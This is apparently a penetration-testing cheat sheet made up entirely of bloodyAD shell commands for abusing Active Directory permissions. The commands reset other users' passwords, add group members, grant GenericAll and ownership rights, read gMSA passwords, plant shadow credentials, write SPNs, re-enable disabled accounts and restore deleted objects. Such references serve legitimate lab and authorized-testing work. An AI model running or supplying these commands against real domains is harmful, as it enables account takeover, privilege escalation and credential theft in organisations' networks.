#### User Informations Gathering
```shell
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username
```
#### Add User to Group
```shell
bloodyAD --host $dc -d $domain -u $username -p $password add groupMember $group_name $member_to_add
```
#### Change Password
 ```shell
 bloodyAD --host $dc -d $domain -u $username -p $password set password $target_username $new_password
 ```
#### Give User GenericAll Rights
```shell
bloodyAD --host $dc -d $domain -u $username -p $password add genericAll $DN $target_username
```
#### WriteOwner
```shell
bloodyAD --host $dc -d $domain -u $username -p $password set owner $target_group $target_username
```
#### ReadGMSAPassword
```shell
bloodyAD --host $dc -d $domain -u $username -p $password get object $target_username --attr msDS-ManagedPassword
```
#### Enable a Disabled Account
```shell
bloodyAD --host $dc -d $domain -u $username -p $password remove uac $target_username -f ACCOUNTDISABLE
```
#### Shadow Credentials
```shell
bloodyAD --host $dc -d $domain -u $username -p $password add shadowCredentials $target
```
#### WriteSPN
```shell
bloodyAD --host $dc -d $domain -u $username -p $password set object $target servicePrincipalName -v 'domain/meow'
```
#### Find Deleted Objects
```shell
bloodyAD --host $dc -d $domain -u $username -p $password get writable --include-del
```
#### Restore a deleted object
```shell
bloodyAD --host $dc -d $domain -u $username -p $password -k set restore $user_to_restore
```
